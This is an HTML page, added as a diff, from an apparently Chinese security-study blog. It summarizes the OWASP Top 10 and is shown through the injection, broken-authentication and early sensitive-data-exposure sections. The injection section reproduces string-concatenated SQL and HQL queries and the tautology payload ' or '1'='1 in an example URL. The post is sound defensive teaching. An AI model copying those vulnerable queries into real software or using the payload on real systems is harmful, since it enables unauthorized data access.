@@ -1,0 +1,453 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>OWASP TOP10 | z3lce学习记录</title><meta name="description" content="注入 将不受信任的数据作为命令或查询的一部分发送到解析器时，会产生诸如SQL注入、 NoSQL注入、 OS注入和LDAP注入的注入缺陷。攻击者的恶意数据可以诱使解析器在没有适当授权的情况下执行非预期命令或访问数据。  漏洞成因   用户提供的数据没有经过应用程序的验证、过滤或净化。   动态查询语句或非参数化的调用，在没有上下文感知转义的情况下，被用于解释器。   在ORM搜索参数中使用了恶意数"><meta name="keywords" content="渗透"><meta name="author" content="z3lce"><meta name="copyright" content="z3lce"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://www.infore.top/2020/11/23/OWASP%20TOP10/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="360-site-verification" content="{&quot;theme_color&quot;:{&quot;enable&quot;:true,&quot;main&quot;:&quot;#49B1F5&quot;,&quot;paginator&quot;:&quot;#00c4b6&quot;,&quot;button_hover&quot;:&quot;#FF7242&quot;,&quot;text_selection&quot;:&quot;#00c4b6&quot;,&quot;link_color&quot;:&quot;#99a9bf&quot;,&quot;meta_color&quot;:&quot;#858585&quot;,&quot;hr_color&quot;:&quot;#A4D8FA&quot;,&quot;code_foreground&quot;:&quot;#F47466&quot;,&quot;code_background&quot;:&quot;rgba(27, 31, 35, .05)&quot;,&quot;toc_color&quot;:&quot;#00c4b6&quot;,&quot;blockquote_padding_color&quot;:&quot;#49b1f5&quot;,&quot;blockquote_background_color&quot;:&quot;#49b1f5&quot;}}"/><meta property="og:type" content="article"><meta property="og:title" content="OWASP TOP10"><meta property="og:url" content="http://www.infore.top/2020/11/23/OWASP%20TOP10/"><meta property="og:site_name" content="z3lce学习记录"><meta property="og:description" content="注入 将不受信任的数据作为命令或查询的一部分发送到解析器时，会产生诸如SQL注入、 NoSQL注入、 OS注入和LDAP注入的注入缺陷。攻击者的恶意数据可以诱使解析器在没有适当授权的情况下执行非预期命令或访问数据。  漏洞成因   用户提供的数据没有经过应用程序的验证、过滤或净化。   动态查询语句或非参数化的调用，在没有上下文感知转义的情况下，被用于解释器。   在ORM搜索参数中使用了恶意数"><meta property="og:image" content="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20200719092909.png"><meta property="article:published_time" content="2020-11-23T03:10:22.000Z"><meta property="article:modified_time" content="2020-11-23T01:10:22.000Z"><meta name="twitter:card" content="summary"><script>var activateDarkMode = function () {
+  document.documentElement.setAttribute('data-theme', 'dark')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
+  }
+}
+var activateLightMode = function () {
+  document.documentElement.setAttribute('data-theme', 'light')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
+  }
+}
+
+var getCookies = function (name) {
+  const value = `; ${document.cookie}`
+  const parts = value.split(`; ${name}=`)
+  if (parts.length === 2) return parts.pop().split(';').shift()
+}
+
+var autoChangeMode = 'false'
+var t = getCookies('theme')
+if (autoChangeMode === '1') {
+  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+  if (t === undefined) {
+    if (isLightMode) activateLightMode()
+    else if (isDarkMode) activateDarkMode()
+    else if (isNotSpecified || hasNoSupport) {
+      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
+      var now = new Date()
+      var hour = now.getHours()
+      var isNight = hour <= 6 || hour >= 18
+      isNight ? activateDarkMode() : activateLightMode()
+    }
+    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+      if (Cookies.get('theme') === undefined) {
+        e.matches ? activateDarkMode() : activateLightMode()
+      }
+    })
+  } else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else if (autoChangeMode === '2') {
+  now = new Date()
+  hour = now.getHours()
+  isNight = hour <= 6 || hour >= 18
+  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+  else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else {
+  if (t === 'dark') activateDarkMode()
+  else if (t === 'light') activateLightMode()
+}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><link rel="prev" title="等级保护" href="http://www.infore.top/2020/11/23/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4/"><link rel="next" title="安全设备理论" href="http://www.infore.top/2020/11/22/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E7%90%86%E8%AE%BA/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  bookmark: {
+    message_prev: '按',
+    message_next: '键将本页加入书签'
+  },
+  runtime_unit: '天',
+  runtime: true,
+  copyright: {"languages":{"author":"作者: z3lce","link":"链接: ","source":"来源: z3lce学习记录","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  ClickShowText: undefined,
+  medium_zoom: false,
+  fancybox: true,
+  Snackbar: {"bookmark":{"message_prev":"按","message_next":"键将本页加入书签"},"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  baiduPush: false,
+  highlightCopy: true,
+  highlightLang: true,
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false    
+}</script><script>var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true
+  }</script><noscript><style>
+#nav {
+  opacity: 1
+}
+.justified-gallery img{
+  opacity: 1
+}
+</style></noscript><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 4.2.1"></head><body><script type="text/javascript" src="/js/crash_cheat.js"></script><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><canvas class="fireworks"></canvas><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar.gif" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">14</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">12</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">10</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#注入"><span class="toc-number">1.</span> <span class="toc-text"> 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞成因"><span class="toc-number">1.1.</span> <span class="toc-text"> 漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#检测方法"><span class="toc-number">1.2.</span> <span class="toc-text"> 检测方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞位置"><span class="toc-number">1.3.</span> <span class="toc-text"> 漏洞位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#危害"><span class="toc-number">1.4.</span> <span class="toc-text"> 危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击案例场景"><span class="toc-number">1.5.</span> <span class="toc-text"> 攻击案例场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#预防措施"><span class="toc-number">1.6.</span> <span class="toc-text"> 预防措施</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#失效的身份认证"><span class="toc-number">2.</span> <span class="toc-text"> 失效的身份认证</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞成因-2"><span class="toc-number">2.1.</span> <span class="toc-text"> 漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞位置-2"><span class="toc-number">2.2.</span> <span class="toc-text"> 漏洞位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#危害-2"><span class="toc-number">2.3.</span> <span class="toc-text"> 危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击案例场景-2"><span class="toc-number">2.4.</span> <span class="toc-text"> 攻击案例场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#预防措施-2"><span class="toc-number">2.5.</span> <span class="toc-text"> 预防措施</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#敏感数据泄露"><span class="toc-number">3.</span> <span class="toc-text"> 敏感数据泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞成因-3"><span class="toc-number">3.1.</span> <span class="toc-text"> 漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞位置-3"><span class="toc-number">3.2.</span> <span class="toc-text"> 漏洞位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#危害-3"><span class="toc-number">3.3.</span> <span class="toc-text"> 危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击案例场景-3"><span class="toc-number">3.4.</span> <span class="toc-text"> 攻击案例场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#预防措施-3"><span class="toc-number">3.5.</span> <span class="toc-text"> 预防措施</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#xml外部实体xxe"><span class="toc-number">4.</span> <span class="toc-text"> XML外部实体（XXE）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞成因-4"><span class="toc-number">4.1.</span> <span class="toc-text"> 漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#检测方法-2"><span class="toc-number">4.2.</span> <span class="toc-text"> 检测方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞位置-4"><span class="toc-number">4.3.</span> <span class="toc-text"> 漏洞位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#危害-4"><span class="toc-number">4.4.</span> <span class="toc-text"> 危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击案例场景-4"><span class="toc-number">4.5.</span> <span class="toc-text"> 攻击案例场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#预防措施-4"><span class="toc-number">4.6.</span> <span class="toc-text"> 预防措施</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#失效的访问控制"><span class="toc-number">5.</span> <span class="toc-text"> 失效的访问控制</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞成因-5"><span class="toc-number">5.1.</span> <span class="toc-text"> 漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#检测方法-3"><span class="toc-number">5.2.</span> <span class="toc-text"> 检测方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#危害-5"><span class="toc-number">5.3.</span> <span class="toc-text"> 危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击案例场景-5"><span class="toc-number">5.4.</span> <span class="toc-text"> 攻击案例场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#预防措施-5"><span class="toc-number">5.5.</span> <span class="toc-text"> 预防措施</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#安全配置错误"><span class="toc-number">6.</span> <span class="toc-text"> 安全配置错误</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞成因-6"><span class="toc-number">6.1.</span> <span class="toc-text"> 漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#检测方法-4"><span class="toc-number">6.2.</span> <span class="toc-text"> 检测方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞位置-5"><span class="toc-number">6.3.</span> <span class="toc-text"> 漏洞位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#危害-6"><span class="toc-number">6.4.</span> <span class="toc-text"> 危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击案例场景-6"><span class="toc-number">6.5.</span> <span class="toc-text"> 攻击案例场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#预防措施-6"><span class="toc-number">6.6.</span> <span class="toc-text"> 预防措施</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#跨站脚本xss"><span class="toc-number">7.</span> <span class="toc-text"> 跨站脚本（XSS）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞成因-7"><span class="toc-number">7.1.</span> <span class="toc-text"> 漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#检测方法-5"><span class="toc-number">7.2.</span> <span class="toc-text"> 检测方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#危害-7"><span class="toc-number">7.3.</span> <span class="toc-text"> 危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击案例场景-7"><span class="toc-number">7.4.</span> <span class="toc-text"> 攻击案例场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#预防措施-7"><span class="toc-number">7.5.</span> <span class="toc-text"> 预防措施</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#不安全的反序列化"><span class="toc-number">8.</span> <span class="toc-text"> 不安全的反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞成因-8"><span class="toc-number">8.1.</span> <span class="toc-text"> 漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#检测方法-6"><span class="toc-number">8.2.</span> <span class="toc-text"> 检测方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞位置-6"><span class="toc-number">8.3.</span> <span class="toc-text"> 漏洞位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#危害-8"><span class="toc-number">8.4.</span> <span class="toc-text"> 危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击案例场景-8"><span class="toc-number">8.5.</span> <span class="toc-text"> 攻击案例场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#预防措施-8"><span class="toc-number">8.6.</span> <span class="toc-text"> 预防措施</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#使用含有已知漏洞的组件"><span class="toc-number">9.</span> <span class="toc-text"> 使用含有已知漏洞的组件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞成因-9"><span class="toc-number">9.1.</span> <span class="toc-text"> 漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#检测方法-7"><span class="toc-number">9.2.</span> <span class="toc-text"> 检测方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#危害-9"><span class="toc-number">9.3.</span> <span class="toc-text"> 危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击案例场景-9"><span class="toc-number">9.4.</span> <span class="toc-text"> 攻击案例场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#预防措施-9"><span class="toc-number">9.5.</span> <span class="toc-text"> 预防措施</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#不足的日志记录和监控"><span class="toc-number">10.</span> <span class="toc-text"> 不足的日志记录和监控</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞成因-10"><span class="toc-number">10.1.</span> <span class="toc-text"> 漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#检测方法-8"><span class="toc-number">10.2.</span> <span class="toc-text"> 检测方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#危害-10"><span class="toc-number">10.3.</span> <span class="toc-text"> 危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击案例场景-10"><span class="toc-number">10.4.</span> <span class="toc-text"> 攻击案例场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#预防措施-10"><span class="toc-number">10.5.</span> <span class="toc-text"> 预防措施</span></a></li></ol></li></ol></div></div></div><div id="body-wrap"><div id="web_bg" data-type="color"></div><header class="post-bg" id="page-header" style="background-image: url(https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20200719092909.png)"><nav id="nav"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/">z3lce学习记录</a></span><span class="pull-right menus"><div id="search_button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">OWASP TOP10</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2020-11-23 11:10:22"><i class="far fa-calendar-alt fa-fw"></i> 发表于 2020-11-23</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2020-11-23 09:10:22"><i class="fas fa-history fa-fw"></i> 更新于 2020-11-23</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fas fa-inbox fa-fw post-meta__icon"></i><a class="post-meta__categories" href="/categories/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4/">等级保护</a></span></div><div class="meta-secondline"> <span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta__icon"></i><span>字数总计:</span><span class="word-count">9.8k</span><span class="post-meta__separator">|</span><i class="far fa-clock fa-fw post-meta__icon"></i><span>阅读时长: 29 分钟</span></span></div><div class="meta-thirdline"><span class="post-meta-pv-cv"><span class="post-meta__separator">|</span><i class="far fa-eye fa-fw post-meta__icon"></i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="注入"><a class="markdownIt-Anchor" href="#注入"></a> 注入</h1>
+<p>将不受信任的数据作为命令或查询的一部分发送到解析器时，会产生诸如SQL注入、 NoSQL注入、 OS注入和LDAP注入的注入缺陷。攻击者的恶意数据可以诱使解析器在没有适当授权的情况下执行非预期命令或访问数据。</p>
+<h2 id="漏洞成因"><a class="markdownIt-Anchor" href="#漏洞成因"></a> 漏洞成因</h2>
+<ul>
+<li>
+<p>用户提供的数据没有经过应用程序的验证、过滤或净化。</p>
+</li>
+<li>
+<p>动态查询语句或非参数化的调用，在没有上下文感知转义的情况下，被用于解释器。</p>
+</li>
+<li>
+<p>在ORM搜索参数中使用了恶意数据，这样搜索就获得包含敏感或未授权的数据。</p>
+</li>
+<li>
+<p>恶意数据直接被使用或连接，诸如SQL语句或命令在动态查询语句、命令或存储过程中包含结构和恶意数据。</p>
+<p>一些常见的注入，包括： SQL、 OS命令、 ORM、 LDAP和表达式语言（EL）或OGNL注入。所有解释器的概念都是相同的。</p>
+</li>
+</ul>
+<h2 id="检测方法"><a class="markdownIt-Anchor" href="#检测方法"></a> 检测方法</h2>
+<p>代码评审是最有效的检测应用程序的注入风险的办法之一【静态应用程序安全测试（SAST）工具】</p>
+<p>紧随其后的是对所有参数、字段、头、 cookie、 JSON和XML数据输入的彻底的DAST【动态应用程序安全测试工具】扫描。</p>
+<h2 id="漏洞位置"><a class="markdownIt-Anchor" href="#漏洞位置"></a> 漏洞位置</h2>
+<p>注入漏洞 通常能在SQL、 LDAP、 XPath或是NoSQL查询语句、 OS 命令、 XML解析器、 SMTP包头、表达式语句及ORM查询语句中找到。</p>
+<h2 id="危害"><a class="markdownIt-Anchor" href="#危害"></a> 危害</h2>
+<p>注入能导致数据丢失、破坏或泄露给无授权方，缺乏可审计性或是拒绝服务。注入有时甚至能导致主机被完全接管。</p>
+<h2 id="攻击案例场景"><a class="markdownIt-Anchor" href="#攻击案例场景"></a> 攻击案例场景</h2>
+<p>场景#1：应用程序在下面存在脆弱性的SQL语句的构造中使用不可信数据：<br />
+String query = “SELECT * FROM accounts WHERE custID=’” + request.getParameter(“id”) + &quot;’“;</p>
+<p>场景#2：同样的，框架应用的盲目信任，仍然可能导致查询语句的漏洞。（例如： ibernate查询语言（HQL））：Query HQLQuery = session.createQuery(“FROM accounts WHERE custID=’” + request.getParameter(“id”) + “’”);</p>
+<p>在这两个案例中，攻击者在浏览器中将“id”参数的值修改成： ’or’1’=’1。例如：<br />
+<a href="http://example.com/app/accountView?id=" target="_blank" rel="noopener">http://example.com/app/accountView?id=</a>’ or ‘1’='1这样查询语句的意义就变成了从accounts表中返回所有的记录。更危险的攻击可能导致数据被篡改甚至是存储过程被调用。</p>
+<h2 id="预防措施"><a class="markdownIt-Anchor" href="#预防措施"></a> 预防措施</h2>
+<p>防止注入漏洞需要将数据与命令语句、查询语句分隔开来。</p>
+<ul>
+<li>最佳选择是使用安全的API，完全避免使用解释器，或提供参数化界面的接口，或迁移到ORM或实体框架。<br />
+注意： 当参数化时，存储过程仍然可以引入SQL注入，如果PL/SQL或T-SQL将查询和数据连接在一起，或者执行带有立即执行或exec()的恶意数据。</li>
+<li>使用正确的或“白名单”的具有恰当规范化的输入验证方法同样会有助于防止注入攻击，但这不是一个完整的防御，因为许多应用程序在输入中需要特殊字符，例如文本区域或移动应用程序的API。</li>
+<li>对于任何剩余的动态查询，可以使用该解释器的特定转义语法转义特殊字符。 OWASP的Java Encoder和类似的库提供了这样的转义例程。<br />
+注意： SQL结构，比如：表名、列名等无法转义，因此用户提供的结构名是非常危险的。这是编写软件中的一个常见问题。</li>
+<li>在查询中使用LIMIT和其他SQL控件，以防止在SQL注入时大量地泄露记录。</li>
+</ul>
+<h1 id="失效的身份认证"><a class="markdownIt-Anchor" href="#失效的身份认证"></a> 失效的身份认证</h1>
+<p>通常，通过错误使用应用程序的身份认证和会话管理功能，攻击者能够破译密码、密钥或会话令牌，或者利用其它开发缺陷来暂时性或永久性冒充其他用户的身份。</p>
+<h2 id="漏洞成因-2"><a class="markdownIt-Anchor" href="#漏洞成因-2"></a> 漏洞成因</h2>
+<ul>
+<li>允许凭证填充，这使得攻击者获得有效用户名和密码的列表。</li>
+<li>允许暴力破解或其他自动攻击。</li>
+<li>允许默认的、弱的或众所周知的密码，例如“Password1”或“admin/admin” 。</li>
+<li>使用弱的或失效的验证凭证，忘记密码程序，例如“基于知识的答案”，这是不安全的。</li>
+<li>使用明文、加密或弱散列密码（参见： A3:2017-敏感数据泄露）。</li>
+<li>缺少或失效的多因素身份验证。</li>
+<li>暴露URL中的会话ID（例如URL重写）。</li>
+<li>在成功登录后不会更新会话ID。</li>
+<li>不正确地使会话ID失效。当用户不活跃的时候，用户会话或认证令牌（特别是单点登录（SSO）令牌）没有正确注销或失效。</li>
+</ul>
+<h2 id="漏洞位置-2"><a class="markdownIt-Anchor" href="#漏洞位置-2"></a> 漏洞位置</h2>
+<p>会话管理是身份验证和访问控制的基础，并且存在于所有有状态应用程序中。</p>
+<h2 id="危害-2"><a class="markdownIt-Anchor" href="#危害-2"></a> 危害</h2>
+<p>攻击者只需要访问几个帐户，或者只需要一个管理员帐户就可以破坏我们的系统。根据应用程序领域的不同，可能会导致放任洗钱、社会安全欺诈以及用户身份盗窃、泄露法律高度保护的敏感信息。</p>
+<h2 id="攻击案例场景-2"><a class="markdownIt-Anchor" href="#攻击案例场景-2"></a> 攻击案例场景</h2>
+<p>场景#1： 凭证填充，使用已知密码的列表，是常见的攻击。如果应用程序不限制身份验证尝试，则可以将应用程序用作密码oracle，以确定凭证是否有效。</p>
+<p>场景#2：大多数身份验证攻击都是由于使用密码作为唯一的因素。依据最佳实践，最新的密码轮换和复杂性要求鼓励用户使用、重用以及重用弱密码。 建议组织在NIST-800-63中停止这些实践，并使用多因素身份验证。</p>
+<p>场景#3：应用会话超时设置不正确。用户使用公共计算机访问应用程序。用户直接关闭浏览器选项卡就离开，而不是选择“注销”。攻击者一小时后使用同一个浏览器浏览网页，而当前用户状态仍然是经过身份验证的。</p>
+<h2 id="预防措施-2"><a class="markdownIt-Anchor" href="#预防措施-2"></a> 预防措施</h2>
+<ul>
+<li>在可能的情况下，实现多因素身份验证，以防止自动、凭证填充、暴力破解和被盗凭据再利用攻击。</li>
+<li>不要使用发送或部署默认的凭证，特别是管理员用户。</li>
+<li>执行弱密码检查，例如测试新或变更的密码，以纠正“排名前10000个弱密码” 列表。</li>
+<li>将密码长度、复杂性和循环策略与NIST-800-63 B的指导方针的5.1.1章节-记住秘密，或其他现代的基于证据的密码策略相一致。</li>
+<li>确认注册、凭据恢复和API路径，通过对所有输出结果使用相同的消息，用以抵御账户枚举攻击。</li>
+<li>限制或逐渐延迟失败的登录尝试。记录所有失败信息并在凭据填充、暴力破解或其他攻击被检测时提醒管理员。</li>
+<li>使用服务器端安全的内置会话管理器，在登录后生成高度复杂的新随机会话ID。会话ID不能在URL中，可以安全地存储和当登出、闲置、绝对超时后使其失效。</li>
+</ul>
+<h1 id="敏感数据泄露"><a class="markdownIt-Anchor" href="#敏感数据泄露"></a> 敏感数据泄露</h1>
+<p>许多Web应用程序和API都无法正确保护敏感数据，例如：财务数据、医疗数据和PII数据。攻击者可以通过窃取或修改未加密的数据来实施信用卡诈骗、身份盗窃或其他犯罪行为。未加密的敏感数据容易受到破坏，因此，我们需要对敏感数据加密，这些数据包括：传输过程中的数据、存储的数据以及浏览器的交互数据</p>
+<h2 id="漏洞成因-3"><a class="markdownIt-Anchor" href="#漏洞成因-3"></a> 漏洞成因</h2>
+<ul>
+<li>在数据传输过程中是否使用明文传输？这和传输协议相关，如：HTTP、 SMTP和FTP。外部网络流量非常危险。验证所有的内部通信，如：负载平衡器、 Web服务器或后端系统之间的通信。</li>
+<li>当数据被长期存储时，无论存储在哪里，它们是否都被加密，包含备份数据？</li>
+<li>无论默认条件还是源代码中，是否还在使用任何旧的或脆弱的加密算法？</li>
+<li>是否使用默认加密密钥，生成或重复使用脆弱的加密密钥，或者缺少恰当的密钥管理或密钥回转？</li>
+<li>是否强制加密敏感数据，例如：用户代理（如：浏览器）指令和传输协议是否被加密？</li>
+<li>用户代理（如：应用程序、邮件客户端）是否未验证服务器端证书的有效性？</li>
+</ul>
+<h2 id="漏洞位置-3"><a class="markdownIt-Anchor" href="#漏洞位置-3"></a> 漏洞位置</h2>
+<ul>
+<li>传输过程中</li>
+<li>存储数据</li>
+</ul>
